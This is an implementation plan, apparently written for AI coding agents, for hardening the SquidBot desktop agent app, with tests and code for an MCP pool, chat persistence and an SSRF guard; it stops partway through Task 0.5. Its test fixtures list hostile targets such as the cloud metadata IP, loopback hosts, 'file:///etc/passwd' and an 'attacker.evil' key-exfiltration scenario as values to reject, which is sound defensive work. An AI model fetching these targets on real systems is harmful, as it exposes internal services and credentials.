# SquidBot 10/10 Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close all ~55 audit findings (security, runtime correctness, memory, UI/UX, governance) across two converging audits, taking SquidBot from "demo-grade" to "10/10 shippable."

**Architecture:** Six sequential sprints, ordered by blast-radius × dependency. Sprint 0 covers the 10 highest-impact issues that are independently committable today. Sprints 1–5 are scoped follow-ups, listed with file paths and acceptance criteria so each can be expanded into its own bite-sized plan before execution.

**Tech Stack:** TypeScript monorepo (npm workspaces), Vitest, Electron + React renderer, better-sqlite3, Node 20+. Tests live in `packages/<x>/test/<file>.test.ts` and run with `npm run test -w packages/<x>`.

---

## Scope Reality (read first)

Two audits converged on ~55 real findings across 7 subsystems. Honest math:

- **Fully TDD'd**, every finding gets 4–6 bite-sized steps → ~280 plan steps → 3–5 sessions of focused work.
- "**Make this app a 10/10 today**" is not literally one calendar day; it's a multi-session arc.

This plan handles the gap by splitting:

| Sprint | Scope | Mode | Sized for |
|---|---|---|---|
| **Sprint 0** | 10 highest-impact issues. Full TDD. Independently committable. | EXECUTE TODAY | ~6–8 hours |
| **Sprint 1** | Encryption + agentic loop + memory enforcement | EXECUTE NEXT SESSION | ~1 day, needs sub-plan |
| **Sprint 2** | Connector + trace + redaction hardening | EXECUTE | ~0.5 day, needs sub-plan |
| **Sprint 3** | Chat router UX (streaming, cancellation, budget, fallback) | EXECUTE | ~0.5 day, needs sub-plan |
| **Sprint 4** | UI/UX polish + a11y | EXECUTE | ~0.5 day, needs sub-plan |
| **Sprint 5** | Coverage gaps + visual regression | EXECUTE | ~0.5 day, needs sub-plan |

**Sprints 1–5 are listed as a backlog index** (files, severity, acceptance criteria) at the bottom of this doc. Expand each into its own dated plan via `superpowers:writing-plans` before executing — that keeps each session right-sized.

---

## File Map

### Files modified in Sprint 0

| File | Lines | Responsibility | Touched by task |
|---|---|---|---|
| `apps/desktop/src/main/ipc.ts` | 2027 | Electron IPC handlers — chat, approvals, MCP, connectors, governance | 0.1, 0.2, 0.3, 0.6, 0.7, 0.8, 0.9 |
| `packages/core/src/runtime.ts` | 1017 | `AgentRuntime`: orchestrates the model, tools, approvals, memory bulletin | 0.2, 0.3, 0.9 |
| `packages/connectors/src/httpTransport.ts` | 421 | `executeRealHttpCall` — outbound HTTP for connector tools | 0.5 |
| `packages/db/src/index.ts` | varies | SQLite schema + accessors | 0.2, 0.3 |

### Files created in Sprint 0

| File | Responsibility |
|---|---|
| `packages/connectors/src/ssrfGuard.ts` | Shared `assertPublicUrl(url)` helper for connectors + ipc URL validators |
| `packages/connectors/test/ssrfGuard.test.ts` | Unit tests for the guard |
| `packages/connectors/test/httpTransport-ssrf.test.ts` | Integration test that `executeRealHttpCall` rejects private IPs |
| `apps/desktop/src/main/mcpAllowlist.ts` | Allowlist for MCP commands + arg shape validation |
| `apps/desktop/test/mcpAllowlist.test.ts` | Unit tests for allowlist |
| `apps/desktop/src/main/mcpPool.ts` | Singleton `McpClientManager` keyed by process lifetime |
| `apps/desktop/test/mcpPool.test.ts` | Reuse + shutdown tests |
| `apps/desktop/src/main/approvalLock.ts` | Per-approval-ID mutex (mirrors sandbox approval locking) |
| `apps/desktop/test/approvalLock.test.ts` | Double-approve race test |
| `packages/db/src/migrations/006_chat_messages.sql` | New `chat_messages` table for multi-turn persistence |
| `packages/db/src/migrations/007_session_state.sql` | New `session_state` table for `lastResolvedAt` watermark |
| `packages/core/test/runtime-history.test.ts` | Multi-turn chat persistence + hydration tests |
| `packages/core/test/runtime-watermark.test.ts` | Watermark persistence across runtime instances |

### Files referenced (read-only context)

- `packages/governance/src/policyEngine.ts` — already has `GovernanceEnforcer.assertAllowed`, just unwired
- `packages/connectors/src/mcpClient.ts` — `McpClientManager.spawnAll` and `.shutdown`
- `apps/desktop/src/main/preload.ts` — IPC method names (keep symmetric with handlers)

---

## Verification baseline

Before Sprint 0 starts, confirm current green state with one command:

```bash
npm run test && npm run typecheck
```

Expected: all packages pass, typecheck clean. This is `3f57c9a`'s known-good state — if it fails, stop and fix the regression first.

After each task: same command must still pass. After every commit: `npm run verify:security` should remain green.

---

# Sprint 0 — Today's Critical Fixes

Each task is committable on its own. Run tests after every step. No batching commits.

Picked order is by **dependency, not severity** — earlier tasks unblock later ones. The MCP singleton (0.1) lands first because it makes the chat-history work (0.2) safe to test without leaking child processes.

---

### Task 0.1: MCP Singleton Pool (stop process leak)

**Why:** `createRuntime` is called on every `sendChatMessage`. Each call spawns the full MCP manager via `mcpManager.spawnAll(...)` (apps/desktop/src/main/ipc.ts:193-205) and never shuts down the previous one. After N messages: N orphaned subprocess trees. Foundation for Sprint 0 — without this fix, the chat-history task (0.2) creates the leak much faster as runtimes get rebuilt.

**Files:**
- Create: `apps/desktop/src/main/mcpPool.ts`
- Create: `apps/desktop/test/mcpPool.test.ts`
- Modify: `apps/desktop/src/main/ipc.ts:177-220` (`createRuntime`)
- Modify: `apps/desktop/src/main/index.ts` (wire shutdown on app quit — find the existing `app.on('before-quit')` or `app.on('window-all-closed')`)

- [ ] **Step 1: Write the failing test for the pool**

Create `apps/desktop/test/mcpPool.test.ts`:

```typescript
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { McpPool, __resetMcpPoolForTests } from "../src/main/mcpPool";
import type { ToolRegistry } from "@squidbot/core";

// Mock McpClientManager so the test doesn't actually spawn processes.
const spawnAll = vi.fn().mockResolvedValue(undefined);
const shutdown = vi.fn().mockResolvedValue(undefined);
vi.mock("@squidbot/connectors", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@squidbot/connectors")>();
  return {
    ...actual,
    McpClientManager: vi.fn().mockImplementation(() => ({
      spawnAll,
      shutdown
    }))
  };
});

describe("McpPool", () => {
  beforeEach(() => {
    __resetMcpPoolForTests();
    spawnAll.mockClear();
    shutdown.mockClear();
  });

  it("creates the manager exactly once across multiple ensureSpawned calls", async () => {
    const registry = { register: vi.fn(), list: vi.fn().mockReturnValue([]) } as unknown as ToolRegistry;
    const servers = [{ name: "fs", transport: "stdio" as const, command: "node", args: [], env: {}, riskLevel: "low" as const }];

    await McpPool.ensureSpawned(registry, servers);
    await McpPool.ensureSpawned(registry, servers);
    await McpPool.ensureSpawned(registry, servers);

    expect(spawnAll).toHaveBeenCalledTimes(1);
  });

  it("shuts down the manager on shutdownAll() and lets a new ensureSpawned restart it", async () => {
    const registry = { register: vi.fn(), list: vi.fn().mockReturnValue([]) } as unknown as ToolRegistry;
    const servers = [{ name: "fs", transport: "stdio" as const, command: "node", args: [], env: {}, riskLevel: "low" as const }];

    await McpPool.ensureSpawned(registry, servers);
    await McpPool.shutdownAll();
    await McpPool.ensureSpawned(registry, servers);

    expect(shutdown).toHaveBeenCalledTimes(1);
    expect(spawnAll).toHaveBeenCalledTimes(2);
  });

  it("returns the same registry across calls without re-registering", async () => {
    const registry = { register: vi.fn(), list: vi.fn().mockReturnValue([]) } as unknown as ToolRegistry;
    const servers = [{ name: "fs", transport: "stdio" as const, command: "node", args: [], env: {}, riskLevel: "low" as const }];

    const r1 = await McpPool.ensureSpawned(registry, servers);
    const r2 = await McpPool.ensureSpawned(registry, servers);

    expect(r1).toBe(r2);
  });
});
```

- [ ] **Step 2: Run test, expect failure**

```bash
npm run test -w apps/desktop -- mcpPool
```

Expected: `Cannot find module '../src/main/mcpPool'`.

- [ ] **Step 3: Implement the pool**

Create `apps/desktop/src/main/mcpPool.ts`:

```typescript
import { McpClientManager } from "@squidbot/connectors";
import type { ToolRegistry } from "@squidbot/core";

type ServerConfig = Parameters<McpClientManager["spawnAll"]>[0][number];

interface PoolState {
  manager: McpClientManager;
  registry: ToolRegistry;
  spawnedSignature: string;
}

let state: PoolState | null = null;
let inflight: Promise<ToolRegistry> | null = null;

function signatureFor(servers: ServerConfig[]): string {
  return JSON.stringify(servers.map((s) => [s.name, s.command, s.args, s.env, s.enabled ?? true]));
}

export const McpPool = {
  async ensureSpawned(registry: ToolRegistry, servers: ServerConfig[]): Promise<ToolRegistry> {
    const sig = signatureFor(servers);
    if (state && state.spawnedSignature === sig) return state.registry;
    if (inflight) return inflight;

    inflight = (async () => {
      if (state) {
        await state.manager.shutdown().catch(() => undefined);
        state = null;
      }
      const manager = new McpClientManager(registry);
      await manager.spawnAll(servers);
      state = { manager, registry, spawnedSignature: sig };
      return registry;
    })();

    try {
      return await inflight;
    } finally {
      inflight = null;
    }
  },

  async shutdownAll(): Promise<void> {
    if (!state) return;
    await state.manager.shutdown().catch(() => undefined);
    state = null;
  }
};

// Test-only: clear the module-level state so tests don't leak between cases.
export function __resetMcpPoolForTests(): void {
  state = null;
  inflight = null;
}
```

- [ ] **Step 4: Run test, expect pass**

```bash
npm run test -w apps/desktop -- mcpPool
```

Expected: 3 tests pass.

- [ ] **Step 5: Wire pool into `createRuntime` and app shutdown**

In `apps/desktop/src/main/ipc.ts:177-220`, find the existing `createRuntime` and replace the inline `mcpManager.spawnAll(...)` block. The current code looks roughly like:

```typescript
const mcpManager = new McpClientManager(toolRegistry);
void mcpManager.spawnAll(
  database.listMcpServers()
    .filter((s) => s.enabled)
    .map(...)
);
```

Replace with:

```typescript
import { McpPool } from "./mcpPool";
// ... in createRuntime, where mcpManager was spawned:
void McpPool.ensureSpawned(
  toolRegistry,
  database.listMcpServers()
    .filter((s) => s.enabled)
    .map((s) => ({
      name: s.name,
      transport: "stdio" as const,
      command: s.command,
      args: s.args,
      env: s.env,
      riskLevel: s.riskLevel
    }))
);
```

In `apps/desktop/src/main/index.ts`, find the `app.on('before-quit', ...)` handler (or add one). Inside it, await `McpPool.shutdownAll()`. Example pattern:

```typescript
import { McpPool } from "./mcpPool";

app.on("before-quit", async (event) => {
  event.preventDefault();
  await McpPool.shutdownAll();
  app.exit(0);
});
```

If a `before-quit` handler already exists, add the `await McpPool.shutdownAll()` call inside it (don't add a second `preventDefault`).

- [ ] **Step 6: Run full desktop suite + typecheck**

```bash
npm run test -w apps/desktop && npm run typecheck -w apps/desktop
```

Expected: green.

- [ ] **Step 7: Commit**

```bash
git add apps/desktop/src/main/mcpPool.ts apps/desktop/test/mcpPool.test.ts apps/desktop/src/main/ipc.ts apps/desktop/src/main/index.ts
git commit -m "$(cat <<'EOF'
fix: singleton MCP pool stops per-message subprocess leak

Each chat message rebuilt the runtime and spawned MCP servers without
shutting down prior ones. Pool keys by server-set signature, reuses
across runtimes, and shuts down cleanly on app quit.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.2: Persist Multi-Turn Chat History

**Why:** `AgentRuntime.messages` is in-memory and `createRuntime` is called per `sendChatMessage` — every turn the model sees an empty history. The UI looks like a conversation; the model sees a sequence of one-shots. This is the single most damaging correctness bug.

**Approach:** New `chat_messages` table keyed by `sessionId`. `AgentRuntime` constructor hydrates `this.messages` from DB. Each appended message persists. Re-using runtime within a process (e.g. CLI REPL) keeps working — DB just becomes the source of truth across instances.

**Files:**
- Create: `packages/db/src/migrations/006_chat_messages.sql`
- Modify: `packages/db/src/index.ts` (add `appendChatMessage` + `listChatMessages` accessors)
- Modify: `packages/core/src/runtime.ts:78` (hydrate `messages` in constructor) + everywhere `this.messages.push(...)` is called
- Create: `packages/core/test/runtime-history.test.ts`

- [ ] **Step 1: Write the failing test (multi-runtime hydration)**

Create `packages/core/test/runtime-history.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { AgentRuntime } from "../src/runtime";
import { createTestDatabase, createTestRouter } from "./helpers"; // assume pattern from existing runtime.test.ts

describe("AgentRuntime — chat history persistence", () => {
  it("hydrates messages from a prior runtime with the same sessionId", async () => {
    const db = createTestDatabase();
    const router = createTestRouter();
    const workspacePath = "/tmp/squid-test";

    const r1 = new AgentRuntime({ database: db, workspacePath, modelRouter: router });
    await r1.sendMessage("My name is Alice.");

    // Simulate a new runtime instance (what happens on the next IPC call).
    const r2 = new AgentRuntime({
      database: db,
      workspacePath,
      modelRouter: router,
      sessionId: r1.sessionId
    });
    const response = await r2.sendMessage("What's my name?");

    // The mock router echoes back the first user message it sees in history.
    // If hydration worked, the second runtime sees "My name is Alice." before
    // the "What's my name?" turn.
    expect(response.assistantMessage).toContain("Alice");
  });

  it("does NOT mix messages across different sessionIds", async () => {
    const db = createTestDatabase();
    const router = createTestRouter();
    const workspacePath = "/tmp/squid-test";

    const sessionA = "session-a";
    const sessionB = "session-b";

    const a = new AgentRuntime({ database: db, workspacePath, modelRouter: router, sessionId: sessionA });
    await a.sendMessage("Alpha message.");

    const b = new AgentRuntime({ database: db, workspacePath, modelRouter: router, sessionId: sessionB });
    const response = await b.sendMessage("What did I say before?");

    expect(response.assistantMessage).not.toContain("Alpha");
  });
});
```

If `createTestRouter`/`createTestDatabase` helpers don't exist, mirror the setup pattern already used in `packages/core/test/runtime.test.ts` — read that file first.

- [ ] **Step 2: Run test, expect failure**

```bash
npm run test -w packages/core -- runtime-history
```

Expected: FAIL — the second runtime's response will not contain "Alice".

- [ ] **Step 3: Write the migration**

Create `packages/db/src/migrations/006_chat_messages.sql`:

```sql
CREATE TABLE IF NOT EXISTS chat_messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  sessionId TEXT NOT NULL,
  role TEXT NOT NULL CHECK (role IN ('system','user','assistant','tool')),
  content TEXT NOT NULL,
  toolCallId TEXT,
  toolCallsJson TEXT,
  createdAt TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_chat_messages_session
  ON chat_messages (sessionId, id);
```

- [ ] **Step 4: Add DB accessors**

In `packages/db/src/index.ts`, locate the area where other table accessors are defined (e.g. near `listMcpServers`) and add:

```typescript
export interface PersistedChatMessage {
  role: "system" | "user" | "assistant" | "tool";
  content: string;
  toolCallId?: string;
  toolCalls?: unknown;
}

// Inside SquidDatabase class:

appendChatMessage(sessionId: string, message: PersistedChatMessage): void {
  this.db
    .prepare(
      `INSERT INTO chat_messages (sessionId, role, content, toolCallId, toolCallsJson)
       VALUES (?, ?, ?, ?, ?)`
    )
    .run(
      sessionId,
      message.role,
      message.content,
      message.toolCallId ?? null,
      message.toolCalls ? JSON.stringify(message.toolCalls) : null
    );
}

listChatMessages(sessionId: string): PersistedChatMessage[] {
  const rows = this.db
    .prepare(`SELECT role, content, toolCallId, toolCallsJson FROM chat_messages WHERE sessionId = ? ORDER BY id ASC`)
    .all(sessionId) as Array<{ role: string; content: string; toolCallId: string | null; toolCallsJson: string | null }>;
  return rows.map((r) => ({
    role: r.role as PersistedChatMessage["role"],
    content: r.content,
    toolCallId: r.toolCallId ?? undefined,
    toolCalls: r.toolCallsJson ? JSON.parse(r.toolCallsJson) : undefined
  }));
}
```

Make sure the migration runner (search `packages/db/src/index.ts` for the existing `migrations/` loader — usually a `for (const file of fs.readdirSync(...))` block) picks up `006_chat_messages.sql`. If migrations are auto-loaded by filename, no extra change needed. If they're explicitly listed, add `"006_chat_messages.sql"` to the array.

- [ ] **Step 5: Hydrate + persist in `AgentRuntime`**

In `packages/core/src/runtime.ts`, change line 78:

```typescript
// before:
private readonly messages: ChatMessage[] = [];

// after:
private messages: ChatMessage[] = [];
```

In the constructor (around line 100-126), at the end:

```typescript
// Hydrate prior conversation history for this session. The DB is the
// source of truth — a fresh runtime started for the same sessionId
// (e.g. on the next IPC call) sees everything sent on prior turns.
const persisted = this.database.listChatMessages(this.sessionId);
this.messages = persisted.map((m) => ({ role: m.role, content: m.content }));
```

Find every `this.messages.push(...)` in the file. For each one, add a paired `this.database.appendChatMessage(this.sessionId, ...)` immediately after. There are typically 2–4 push sites (user message, assistant response, possibly system notes). Example transformation:

```typescript
// before:
this.messages.push({ role: "user", content: message });

// after:
this.messages.push({ role: "user", content: message });
this.database.appendChatMessage(this.sessionId, { role: "user", content: message });
```

Do NOT persist the system prompt — it's regenerated from identity on each turn (`buildMessagesForModel`).

- [ ] **Step 6: Run test, expect pass**

```bash
npm run test -w packages/core -- runtime-history
```

Expected: both tests pass.

- [ ] **Step 7: Run full core suite to check no regressions**

```bash
npm run test -w packages/core
```

Expected: all green. If `runtime.test.ts` fails because some test reuses a sessionId across runtime instances expecting a fresh history, the test was depending on the bug — update those tests to use unique sessionIds.

- [ ] **Step 8: Commit**

```bash
git add packages/db/src/migrations/006_chat_messages.sql packages/db/src/index.ts packages/core/src/runtime.ts packages/core/test/runtime-history.test.ts
git commit -m "$(cat <<'EOF'
fix: persist multi-turn chat history so the model sees prior turns

AgentRuntime.messages was in-memory and createRuntime is called per
IPC request, so every chat turn arrived at the model with no history.
Added chat_messages table; runtime hydrates on construction and
appends on each push.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.3: Persist Approval High-Water Mark

**Why:** `lastResolvedAtBySession` (runtime.ts:98) is in-memory. Each new runtime instance starts at `Date.now() - 60_000`, re-surfacing any approval resolved in the last minute → duplicate system notes, wasted tokens.

**Approach:** Reuse the existing `settings` table with a per-session key `chat.lastResolvedAt.<sessionId>`. No new schema needed.

**Files:**
- Modify: `packages/core/src/runtime.ts:167-219` (`buildResolvedApprovalsNote`)
- Create: `packages/core/test/runtime-watermark.test.ts`

- [ ] **Step 1: Write the failing test**

Create `packages/core/test/runtime-watermark.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { AgentRuntime } from "../src/runtime";
import { createTestDatabase, createTestRouter } from "./helpers";

describe("AgentRuntime — approval watermark persistence", () => {
  it("does not re-surface a resolved approval after runtime restart", async () => {
    const db = createTestDatabase();
    const router = createTestRouter();
    const workspacePath = "/tmp/squid-test";
    const sessionId = "watermark-session";

    // Seed a resolved approval for this session.
    db.db.prepare(
      `INSERT INTO pending_approvals (id, kind, callerSessionId, payloadJson, resolution, resolvedAt, resultJson, createdAt)
       VALUES (?, 'connector-call', ?, ?, 'approved', ?, ?, ?)`
    ).run(
      "appr-1",
      sessionId,
      JSON.stringify({ connectorName: "github", operationId: "createIssue" }),
      new Date().toISOString(),
      JSON.stringify({ status: 201 }),
      new Date().toISOString()
    );

    const r1 = new AgentRuntime({ database: db, workspacePath, modelRouter: router, sessionId });
    await r1.sendMessage("hi");
    // r1 should have surfaced the approval once.

    const r2 = new AgentRuntime({ database: db, workspacePath, modelRouter: router, sessionId });
    const response = await r2.sendMessage("hi again");

    // The second runtime must NOT re-surface the approval — the high-water
    // mark persisted across runtimes.
    expect(response.assistantMessage).not.toContain("appr-1");
  });
});
```

- [ ] **Step 2: Run test, expect failure**

```bash
npm run test -w packages/core -- runtime-watermark
```

Expected: FAIL — second runtime re-surfaces "appr-1".

- [ ] **Step 3: Replace in-memory map with DB-backed read/write**

In `packages/core/src/runtime.ts`, remove the field declaration at line 98:

```typescript
// remove this line:
private readonly lastResolvedAtBySession = new Map<string, string>();
```

Add two helpers (place after the constructor):

```typescript
private getLastResolvedAt(): string {
  const stored = this.database.getSetting<string>(`chat.lastResolvedAt.${this.sessionId}`);
  return stored ?? new Date(Date.now() - 60_000).toISOString();
}

private setLastResolvedAt(value: string): void {
  this.database.setSetting(`chat.lastResolvedAt.${this.sessionId}`, value);
}
```

In `buildResolvedApprovalsNote` (lines 167-219), replace:

```typescript
const lastSeen =
  this.lastResolvedAtBySession.get(this.sessionId)
  ?? new Date(Date.now() - 60_000).toISOString();
```

with:

```typescript
const lastSeen = this.getLastResolvedAt();
```

And replace the line near 214:

```typescript
this.lastResolvedAtBySession.set(this.sessionId, bumped);
```

with:

```typescript
this.setLastResolvedAt(bumped);
```

- [ ] **Step 4: Run test, expect pass**

```bash
npm run test -w packages/core -- runtime-watermark
```

Expected: PASS.

- [ ] **Step 5: Run full core suite for regressions**

```bash
npm run test -w packages/core
```

Expected: green.

- [ ] **Step 6: Commit**

```bash
git add packages/core/src/runtime.ts packages/core/test/runtime-watermark.test.ts
git commit -m "$(cat <<'EOF'
fix: persist approval high-water mark per session

In-memory map reset every runtime construction, re-surfacing the same
approval each chat turn. Stored in settings table now so it survives
the per-message runtime rebuilds.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.4: SSRF Guard on `executeRealHttpCall`

**Why:** Generic connector HTTP path will fetch `169.254.169.254` (cloud metadata), `localhost`, or RFC1918 LAN hosts with the configured bearer token. The existing `discoverModels` guard exists but isn't shared.

**Files:**
- Create: `packages/connectors/src/ssrfGuard.ts`
- Create: `packages/connectors/test/ssrfGuard.test.ts`
- Create: `packages/connectors/test/httpTransport-ssrf.test.ts`
- Modify: `packages/connectors/src/httpTransport.ts:344-360` (apply guard after URL construction)

- [ ] **Step 1: Write the failing test for the guard**

Create `packages/connectors/test/ssrfGuard.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { assertPublicHttpUrl, SsrfError } from "../src/ssrfGuard";

describe("assertPublicHttpUrl", () => {
  it.each([
    "http://localhost/x",
    "http://127.0.0.1/x",
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1/x",
    "http://192.168.1.1/x",
    "http://172.16.0.1/x",
    "http://[::1]/x",
    "http://[fc00::1]/x",
    "ftp://example.com/x",
    "file:///etc/passwd"
  ])("rejects %s", (url) => {
    expect(() => assertPublicHttpUrl(url)).toThrow(SsrfError);
  });

  it.each([
    "https://api.github.com/repos",
    "https://example.com/x",
    "http://example.com/x"
  ])("allows %s", (url) => {
    expect(() => assertPublicHttpUrl(url)).not.toThrow();
  });

  it("allows http on a configured private host when explicitly permitted", () => {
    expect(() => assertPublicHttpUrl("http://localhost/x", { allowPrivate: true })).not.toThrow();
  });
});
```

- [ ] **Step 2: Run test, expect failure**

```bash
npm run test -w packages/connectors -- ssrfGuard
```

Expected: FAIL — module missing.

- [ ] **Step 3: Implement the guard**

Create `packages/connectors/src/ssrfGuard.ts`:

```typescript
import { isIP } from "node:net";

export class SsrfError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "SsrfError";
  }
}

const PRIVATE_V4_RANGES: Array<[number, number, number, number]> = [
  [10, 0, 0, 8],          // 10.0.0.0/8
  [172, 16, 0, 12],       // 172.16.0.0/12 -> mask handled below
  [192, 168, 0, 16],      // 192.168.0.0/16
  [127, 0, 0, 8],         // loopback
  [169, 254, 0, 16],      // link-local (incl. cloud metadata)
  [0, 0, 0, 8]            // 0.0.0.0/8
];

function isPrivateIPv4(addr: string): boolean {
  const parts = addr.split(".").map(Number);
  if (parts.length !== 4 || parts.some((p) => Number.isNaN(p) || p < 0 || p > 255)) return false;
  if (parts[0] === 10) return true;
  if (parts[0] === 127) return true;
  if (parts[0] === 0) return true;
  if (parts[0] === 169 && parts[1] === 254) return true;
  if (parts[0] === 192 && parts[1] === 168) return true;
  if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
  return false;
}

function isPrivateIPv6(addr: string): boolean {
  const lower = addr.toLowerCase();
  if (lower === "::1" || lower === "::") return true;
  if (lower.startsWith("fc") || lower.startsWith("fd")) return true; // ULA fc00::/7
  if (lower.startsWith("fe80:")) return true; // link-local
  if (lower.startsWith("::ffff:")) {
    // IPv4-mapped — re-check as v4
    const v4 = lower.slice("::ffff:".length);
    if (isIP(v4) === 4) return isPrivateIPv4(v4);
  }
  return false;
}

const PRIVATE_HOSTNAMES = new Set(["localhost", "ip6-localhost", "ip6-loopback"]);

export interface SsrfGuardOptions {
  allowPrivate?: boolean;
}

export function assertPublicHttpUrl(rawUrl: string, opts: SsrfGuardOptions = {}): URL {
  let url: URL;
  try {
    url = new URL(rawUrl);
  } catch {
    throw new SsrfError(`Invalid URL: ${rawUrl}`);
  }

  if (url.protocol !== "http:" && url.protocol !== "https:") {
    throw new SsrfError(`Disallowed protocol: ${url.protocol}`);
  }

  if (opts.allowPrivate) return url;

  // Bracketed IPv6 literal
  const hostname = url.hostname.startsWith("[") && url.hostname.endsWith("]")
    ? url.hostname.slice(1, -1)
    : url.hostname;

  if (PRIVATE_HOSTNAMES.has(hostname.toLowerCase())) {
    throw new SsrfError(`Disallowed private host: ${hostname}`);
  }

  const ipKind = isIP(hostname);
  if (ipKind === 4 && isPrivateIPv4(hostname)) {
    throw new SsrfError(`Disallowed private IPv4: ${hostname}`);
  }
  if (ipKind === 6 && isPrivateIPv6(hostname)) {
    throw new SsrfError(`Disallowed private IPv6: ${hostname}`);
  }

  return url;
}
```

Export it from `packages/connectors/src/index.ts` so other packages can use it:

```typescript
export { assertPublicHttpUrl, SsrfError } from "./ssrfGuard";
```

- [ ] **Step 4: Run guard test, expect pass**

```bash
npm run test -w packages/connectors -- ssrfGuard
```

Expected: all green.

- [ ] **Step 5: Write the integration test for `executeRealHttpCall`**

Create `packages/connectors/test/httpTransport-ssrf.test.ts`:

```typescript
import { describe, it, expect, vi } from "vitest";
import { executeRealHttpCall } from "../src/httpTransport";

const minimalManifest = {
  name: "test",
  endpoints: [],
  authScheme: "bearer" as const
};

const minimalEndpoint = {
  operationId: "ping",
  method: "GET",
  path: "/ping"
};

describe("executeRealHttpCall SSRF rejection", () => {
  it.each([
    "http://169.254.169.254",
    "http://localhost:8080",
    "http://10.0.0.5"
  ])("rejects %s without calling fetch", async (baseUrl) => {
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const result = await executeRealHttpCall(
      minimalManifest as never,
      minimalEndpoint as never,
      {},
      { baseUrl, apiKey: "test-key" }
    );
    expect(result.ok).toBe(false);
    expect(result.code).toBe("ssrf");
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
  });
});
```

- [ ] **Step 6: Run test, expect failure**

```bash
npm run test -w packages/connectors -- httpTransport-ssrf
```

Expected: FAIL — fetch is being called.

- [ ] **Step 7: Apply guard inside `executeRealHttpCall`**

In `packages/connectors/src/httpTransport.ts`, around line 344-360 (after URL construction, before fetch):

```typescript
// before, near line 359 (after url is assembled):
// (end of try block — currently returns on URL error)

// add immediately after URL is finalized:
import { assertPublicHttpUrl, SsrfError } from "./ssrfGuard";

// inside the function, after `url = ...` is constructed:
try {
  assertPublicHttpUrl(url);
} catch (err) {
  if (err instanceof SsrfError) {
    return {
      ok: false,
      code: "ssrf" as const,
      durationMs: Date.now() - start,
      message: err.message
    };
  }
  throw err;
}
```

Also add `"ssrf"` to the `HttpCallResult` `code` union near the top of the file (search for `code:` and the existing union of `"auth" | "forbidden" | ...`).

- [ ] **Step 8: Run integration test, expect pass**

```bash
npm run test -w packages/connectors -- httpTransport-ssrf
```

Expected: PASS.

- [ ] **Step 9: Run full connectors suite**

```bash
npm run test -w packages/connectors
```

Expected: green. If any existing test used `http://localhost:...` as a base URL (test fixtures sometimes do), update those tests to pass `{ allowPrivate: true }` via a new optional param to `executeRealHttpCall`, OR refactor the test to use a mock fetch and a public-looking URL like `http://example.com`. Prefer the latter — the guard should not have a runtime bypass.

- [ ] **Step 10: Commit**

```bash
git add packages/connectors/src/ssrfGuard.ts packages/connectors/test/ssrfGuard.test.ts packages/connectors/test/httpTransport-ssrf.test.ts packages/connectors/src/httpTransport.ts packages/connectors/src/index.ts
git commit -m "$(cat <<'EOF'
security: SSRF guard rejects private/loopback/link-local hosts

executeRealHttpCall accepted any URL the operator configured as
baseUrl, including 169.254.169.254 cloud metadata. Centralized guard
in ssrfGuard.ts; reusable by the IPC-layer validators added next.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.5: `model.apiUrl` Validation on Save

**Why:** `saveSetting("model.apiUrl", ...)` and `upsertModelAccount` accept any URL. Setting it to `http://attacker.evil` ships the API key on the next chat. Validator exists but is only called from `discoverModels`.

**Files:**
- Modify: `apps/desktop/src/main/ipc.ts:272-318` (`saveSetting`) and `:1721-1755` (`upsertModelAccount`)
- Create: `apps/desktop/test/saveSetting-apiUrl.test.ts`

- [ ] **Step 1: Read the existing `saveSetting` and `upsertModelAccount` handlers**

```bash
sed -n '260,330p' apps/desktop/src/main/ipc.ts
sed -n '1715,1760p' apps/desktop/src/main/ipc.ts
```

Note the exact shape — settings key allowlist, validation, error response shape.

- [ ] **Step 2: Write the failing test**

Create `apps/desktop/test/saveSetting-apiUrl.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { coerceApiUrl } from "../src/main/apiUrlValidator";

describe("coerceApiUrl", () => {
  it.each([
    "http://localhost/v1",
    "http://127.0.0.1/v1",
    "http://169.254.169.254/v1",
    "http://10.0.0.5/v1",
    "ftp://example.com",
    "javascript:alert(1)",
    ""
  ])("rejects %s", (url) => {
    expect(() => coerceApiUrl(url)).toThrow();
  });

  it.each([
    "https://api.openai.com/v1",
    "https://api.anthropic.com/v1",
    "http://example.com/v1"
  ])("accepts %s", (url) => {
    expect(() => coerceApiUrl(url)).not.toThrow();
  });
});
```

- [ ] **Step 3: Run, expect failure**

```bash
npm run test -w apps/desktop -- saveSetting-apiUrl
```

Expected: FAIL — module missing.

- [ ] **Step 4: Implement the validator**

Create `apps/desktop/src/main/apiUrlValidator.ts`:

```typescript
import { assertPublicHttpUrl, SsrfError } from "@squidbot/connectors";

export class ApiUrlError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "ApiUrlError";
  }
}

export function coerceApiUrl(raw: string): string {
  if (typeof raw !== "string" || raw.trim().length === 0) {
    throw new ApiUrlError("apiUrl must be a non-empty string");
  }
  try {
    const url = assertPublicHttpUrl(raw);
    return url.toString();
  } catch (err) {
    if (err instanceof SsrfError) {
      throw new ApiUrlError(`Refusing apiUrl: ${err.message}`);
    }
    throw err;
  }
}
```

- [ ] **Step 5: Apply in `saveSetting` and `upsertModelAccount`**

